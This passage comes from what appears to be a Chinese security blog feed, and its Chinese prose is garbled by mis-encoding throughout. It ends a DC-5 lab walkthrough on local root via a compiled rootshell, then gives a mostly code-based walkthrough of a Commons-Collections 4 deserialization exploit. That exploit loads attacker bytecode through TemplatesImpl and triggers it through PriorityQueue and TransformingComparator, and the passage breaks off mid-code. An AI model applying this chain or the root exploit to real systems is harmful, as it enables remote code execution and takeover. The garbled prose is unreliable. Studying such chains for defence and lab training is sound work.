class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>ç„¶åå°†å‰©ä¸‹çš„å‘½ä»¤éƒ¨åˆ†ä¿å­˜ä¸º<code>dc5.sh</code>å¤´éƒ¨åŠ ä¸Š#!&#x2F;bin&#x2F;bashé˜²æ­¢ä¹±ç <br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525981.png" alt="image-20230706152533941"><br>ç„¶åç”¨vimç¼–è¾‘å®ƒï¼Œä½¿ç”¨<code>:set ff=unix</code>æ¥ä¿å­˜<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525014.png" alt="image-20230706152547920"><br>ç„¶åæŠŠè¿™ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºçš„tmpç›®å½•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061526339.png" alt="image-20230706152608276"><br>ç»™<code>dc5.sh</code>èµ‹æ‰§è¡Œæƒé™åæ‰§è¡Œï¼Œè¿™é‡Œç”±äºæˆ‘å‡ºäº†é—®é¢˜æ‰€ä»¥æœ€åå¼¹äº†shellæ‰§è¡Œçš„<code>run.sh</code>å½“ç„¶è¿™é‡Œæ–‡ä»¶åä¸é‡è¦éšä¾¿å°±è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061526044.png" alt="image-20230706152624999"><br>è¿™é‡ŒæŠ¥é”™äº†ï¼Œä¸€ç›´æ²¡æœ‰çœ‹æŠ¥é”™çš„ä¹ æƒ¯æ‰¾äº†åŠå¤©åšå®¢ä¼¼ä¹éƒ½æ²¡å¸ˆå‚…é‡åˆ°è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®è¿™é‡Œå°±æ˜¯glibcç‰ˆæœ¬é—®é¢˜ï¼Œæˆ‘kalié»˜è®¤ä½¿ç”¨äº†2.34è¿™ä¸ªç‰ˆæœ¬ï¼Œè€Œé¶æœºæ ¹æœ¬æ²¡æœ‰è¿™ä¸ªç‰ˆæœ¬<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061528312.png" alt="image-20230706152807259"><br>æ‰€ä»¥ä¸€ç›´æŠ¥é”™ï¼Œåé¢æŠŠ<code>rootshell.c</code>æ”¾åˆ°é¶æœºä¸Šé¢ç¼–è¯‘ç„¶åå†æ‰§è¡Œrun.shæˆåŠŸææƒï¼Œé‡åˆ°é—®é¢˜è¿˜æ˜¯è¦å…ˆåˆ†æä¸€ä¸‹æŠ¥é”™å•Š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061528826.png" alt="image-20230706152818770"><br>ä¸Šé¢çš„eximæˆ‘è¯•äº†<code>4.84.3</code>è¿™ä¸ªç‰ˆæœ¬ä½†æ˜¯å¤±è´¥äº†ï¼Œé¶æœºæ˜¯<code>4.84.2</code>ä½†æ˜¯msfæ²¡æœ‰expæœ€ç»ˆå¤±è´¥äº†</p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾4</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE4/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE4/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>å…¶å®ƒçš„å’Œå‰é¢ä¸€æ ·ï¼Œåªä¸è¿‡Commons-Collections ä¾èµ–å˜ä¸ºäº†4.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>åœ¨CC4ä¸Šå°¾éƒ¨çš„å‘½ä»¤æ‰§è¡Œæ²¡æœ‰ä»€ä¹ˆå˜åŒ–åå°„æˆ–è€…åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œæ”¹å˜çš„æ˜¯CC4å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œé‚£ä¹ˆInvokerTransformerç”¨ä¸äº†äº†å°±è¦æ‰¾è°è°ƒç”¨äº†<code>transform()</code>éšä¾¿ç”¨ä¸ªç±»ç„¶åfind usages <code>transform()</code>è¿™é‡Œæœ€ç»ˆæ‰¾çš„æ˜¯<code>TransformingComparator</code> ç±»ä¸­çš„<code>compare</code>æ–¹æ³•è°ƒç”¨äº†<code>transform()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247478.png" alt="image-20230705124539354"><br><code>compare</code>æ–¹æ³•åœ¨Javaä¸­ä¹Ÿæ˜¯å¸¸ç”¨çš„ï¼Œç”¨äºä¸¤ä¸ªå¯¹è±¡çš„å¤§å°æ¯”è¾ƒï¼Œç»§ç»­å¾€å‰æ‰¾çœ‹è°è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œç›´æ¥find usagesæ‰¾ä¸åˆ°ï¼Œçœ‹ç»„é•¿è§†é¢‘è¯´å¾—å¯¹å¼€å‘æ¯”è¾ƒç†Ÿæ‚‰ï¼Œå¼€å‘æˆ‘æ˜¯ä¸€ç‚¹ä¸ç†Ÿå•Šï¼Œéš¾å—ï¼Œæœ€åç›´æ¥ç»™å‡ºäº†<code>PriorityQueue</code>ç±»ç”¨äºä¼˜å…ˆé˜Ÿåˆ—çš„æ“ä½œï¼Œåœ¨è¿™ä¸ªç±»ä¸­è°ƒç”¨äº†<code>compare</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247664.png" alt="image-20230705124731533"><br>ç„¶åç»§ç»­å¾€ä¸Šæ‰¾æ‰¾åˆ°äº†è¿™ä¸ªç±»ä¸­çš„readObjectæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247635.png"><br>é‚£ä¹ˆå…¶å®åˆ°è¿™é‡Œå¯ä»¥çœ‹åˆ°å…¥å£ç±»å°±å˜äº†ï¼Œé“¾å­åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œæ¥ä¸‹æ¥ç¼–å†™EXP</p><h2 id="EXPç¼–å†™"><a href="#EXPç¼–å†™" class="headerlink" title="EXPç¼–å†™"></a>EXPç¼–å†™</h2><p>å…ˆæŠŠåé¢çš„åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œå†™å‡ºæ¥ï¼Œå’ŒCC3ä¸€æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œ  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆåŠŸ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247890.png" alt="image-20230705124756650"><br>ç„¶åå°±æ˜¯æ”¾å¼ƒ<code>InvokerTransformer</code>è½¬ç”¨<code>TransformingComparator</code> ç±»çš„ <code>compare()</code>æ–¹æ³•ï¼Œå†ç”¨PriorityQueueç±»å½“å…¥å£å»è°ƒç”¨ï¼Œç„¶åå¯¹PriorityQueueåºåˆ—åŒ–ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œ  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">        serialize(priorityQueue);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œå¼¹å‡ºè®¡ç®—å™¨å¤±è´¥è¯´æ˜ä¸­é—´å‡ºäº†é—®é¢˜ï¼Œdebugä¸€ä¸‹ï¼Œæ–­ç‚¹å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248413.png" alt="image-20230705124810172"><br>é—®é¢˜å‡ºåœ¨ä¸‹é¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248848.png" alt="image-20230705124816746"><br>è°ƒè¯•å‘ç°å¹¶æ²¡æœ‰è¿›å…¥<code>siftDown</code>æ–¹æ³•ï¼Œè€Œæˆ‘ä»¬è¦æ±‚å°±æ˜¯è¦è¿›å…¥ï¼Œå¯»æ‰¾ä¸€ä¸‹åŸå› </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br></pre></td></tr></table></figure><p>å½“ä»£ç èµ°åˆ°è¿™é‡Œçš„æ—¶å€™sizeä¸º0ï¼Œå½“sizeä¸º1çš„æ—¶å€™å³ç§»1ä½è¿˜æ˜¯0<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248594.png" alt="image-20230705124853515"><br>å½“sizeä¸º2å³å¯å¾—åˆ°1è¿›å…¥forå¾ªç¯ï¼Œè€Œè¿™ä¸ªsizeå°±æ˜¯é˜Ÿåˆ—çš„é•¿åº¦ï¼Œé‚£ä¹ˆæˆ‘å¾€è¿™ä¸ªé˜Ÿåˆ—é‡Œé¢åŠ ç‚¹ä¸œè¥¿å°±è¡Œäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);  </span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051249225.png" alt="image-20230705124905041"><br>æ­¤æ—¶å¼¹å‡ºè®¡ç®—å™¨äº†ï¼Œä½†æ˜¯è¿™é‡ŒæŠ¥é”™ï¼Œå½“æˆ‘æŠŠåºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ³¨é‡Šä¹‹åè¿˜æ˜¯å¼¹äº†è®¡ç®—å™¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061925481.png" alt="image-20230706192532303"><br>è¯´æ˜è¿™ä¸ªè®¡ç®—å™¨å¼¹çš„å’Œåºåˆ—åŒ–æ²¡å…³ç³»ï¼Œé—®é¢˜å°±å‡ºåœ¨äº†è¿™ä¸ª<code>priorityQueue.add(1);</code>è·Ÿè¿›å»çœ‹ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061925964.png" alt="image-20230706192237127"><br>å‘ç°è¿™ä¸ªaddç›´æ¥ä¼šè¿›å…¥åˆ°compareæ–¹æ³•ï¼Œç›´æ¥å°±åœ¨æœ¬åœ°æ‰§è¡Œäº†æ²¡ç©çš„äº†ï¼Œæ‰€ä»¥å¾—é¿å…æœ¬åœ°æ‰§è¡Œ<br>æŠ¥é”™çš„åŸå› å…¶å®æ˜¯CC3é‡Œçš„<code>_tfactory</code> å€¼ï¼Œéƒ½å¿˜äº†è¿™æ˜¯å¹²å˜›çš„äº†ï¼Œåœ¨å‰é¢çš„expä¸­å°‘äº†ä¸€å¥<code>templates.newTransformer();</code>å¯¼è‡´æŠ¥é”™åŠ ä¸Šå°±è¡Œäº†å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>ä½†å…¶å®è¿™é‡Œæ ¹æœ¬æ²¡å•¥å…³ç³»ï¼Œæœ¬æ¥å°±ä¸æƒ³è®©å®ƒåœ¨æœ¬åœ°æ‰§è¡Œï¼Œè§£å†³addçš„é—®é¢˜å’Œå‰é¢CC1ï¼ˆå¥½åƒæ˜¯ä¸è®°å¾—äº†ï¼‰ä¸€æ ·æŠŠ<code>transformingComparator</code> çš„å€¼æ”¹ä¸ºä¸€ä¸ªæ— å…³çš„å¯¹è±¡ï¼Œåœ¨ add å®Œä¹‹åå†ç”¨åå°„ä¿®æ”¹å›æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œ  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  